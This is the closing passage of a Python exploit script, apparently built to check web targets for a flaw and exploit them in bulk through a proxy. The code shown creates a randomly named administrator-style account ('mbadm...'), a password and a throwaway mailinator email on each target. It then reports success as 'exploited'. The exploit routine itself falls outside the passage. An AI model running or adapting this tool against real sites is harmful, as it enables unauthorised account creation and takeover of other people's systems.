            args.url, args.timeout, args.proxy, paths,
            form_url=args.form_url, object_id=args.object_id,
        )
        if single_flow:
            log(flow_check_line(row))
        print(json.dumps(row, ensure_ascii=True, indent=2))
        sys.exit(0 if row.get("exploitable_candidate") else 1)

    uname = args.username or ("mbadm" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6)))
    pwd = args.password or ("MbAio!" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8)))
    if single_flow:
        log("[*] exploiting %s ..." % normalize_base(args.url))
    row = exploit_target(
        args.url, args.timeout, args.proxy, paths,
        args.form_url, args.object_id, uname, args.email or "", pwd,
        args.verify, args.shortcode,
    )
    if not row.get("email"):
        row["email"] = row["username"] + "@mailinator.com"
    if single_flow:
        log(flow_exploit_line(row))
    print(json.dumps(row, ensure_ascii=True, indent=2, default=str))
    sys.exit(0 if row.get("exploited") else 1)


if __name__ == "__main__":
    main()
